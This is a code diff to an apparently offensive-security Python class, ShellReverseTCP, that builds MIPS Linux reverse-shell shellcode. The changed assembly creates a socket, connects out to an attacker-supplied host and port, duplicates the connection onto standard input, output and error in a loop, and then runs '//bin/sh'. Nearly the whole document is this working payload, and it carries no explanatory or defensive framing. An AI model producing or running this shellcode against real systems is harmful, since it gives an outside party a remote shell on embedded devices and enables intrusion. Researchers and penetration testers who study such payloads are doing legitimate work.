@@ -46,62 +46,58 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
 
         shellcode = f"""
         start:
-            slti $a0, $zero, -1
-            addiu $v0, $zero, 0xfa6
-            syscall 0x42424
-
-            slti $a0, $zero, 0x1111
-            addiu $v0, $zero, 0xfa6
-            syscall 0x42424
-
-            addiu $t4, $zero, -3
-            not $a0, $t4
-            addiu $v0, $zero, 0xfa6
-            syscall 0x42424
-
-            addiu $t4, $zero, -3
-            not $a0, $t4
-            not $a1, $t4
+            addiu $t7, $zero, -6
+            not $t7, $t7
+            addi $a0, $t7, -3
+            addi $a1, $t7, -3
             slti $a2, $zero, -1
             addiu $v0, $zero, 0x1057
-            syscall 0x42424
+            syscall 0x40404
 
-            andi $a0, $v0, 0xffff
-            addiu $v0, $zero, 0xfc9
-            syscall 0x42424
-
-            addiu $v0, $zero, 0xfc9
-            syscall 0x42424
-
-            lui $a1, 2
-            ori $a1, $a1, 0x{rport.hex()}
-            sw $a1, -8($sp)
-            lui $a1, 0x{rhost[2:].hex()}
-            ori $a1, $a1, 0x{rhost[:2].hex()}
-            sw $a1, -4($sp)
-            addi $a1, $sp, -8
+            sw $v0, -1($sp)
+            lw $a0, -1($sp)
+            ori $t7, $zero, 0xfffd
+            not $t7, $t7
+            sw $t7, -0x20($sp)
+            lui $t6, 0x{rport.hex()}
+            ori $t6, $t6, 0x{rport.hex()}
+            sw $t6, -0x1c($sp)
+            lui $t6, 0x{rhost[2:].hex()}
+            ori $t6, $t6, 0x{rhost[:2].hex()}
+            sw $t6, -0x1a($sp)
+            addiu $a1, $sp, -0x1e
             addiu $t4, $zero, -0x11
             not $a2, $t4
             addiu $v0, $zero, 0x104a
-            syscall 0x42424
+            syscall 0x40404
 
-            lui $t0, 0x2f2f
-            ori $t0, $t0, 0x6269
-            sw $t0, -0x14($sp)
-            lui $t0, 0x6e2f
-            ori $t0, $t0, 0x7368
-            sw $t0, -0x10($sp)
-            slti $a3, $zero, -1
-            sw $a3, -0xc($sp)
-            sw $a3, -4($sp)
-            addi $a0, $sp, -0x14
-            addi $t0, $sp, -0x14
-            sw $t0, -8($sp)
-            addi $a1, $sp, -8
-            addiu $sp, $sp, -0x14
+            addiu $s1, $zero, -3
+            not $s1, $s1
+            lw $a0, -1($sp)
+
+        dup:
+            move $a1, $s1
+            addiu $v0, $zero, 0xfdf
+            syscall 0x40404
+
+            addiu $s0, $zero, -1
+            addi $s1, $s1, -1
+            bne $s1, $s0, dup
+
             slti $a2, $zero, -1
+            lui $t7, 0x2f2f
+            ori $t7, $t7, 0x6269
+            sw $t7, -0x14($sp)
+            lui $t6, 0x6e2f
+            ori $t6, $t6, 0x7368
+            sw $t6, -0x10($sp)
+            sw $zero, -0xc($sp)
+            addiu $a0, $sp, -0x14
+            sw $a0, -8($sp)
+            sw $zero, -4($sp)
+            addiu $a1, $sp, -8
             addiu $v0, $zero, 0xfab
-            syscall 0x2424d
+            syscall 0x40404
         """
 
         if assemble:
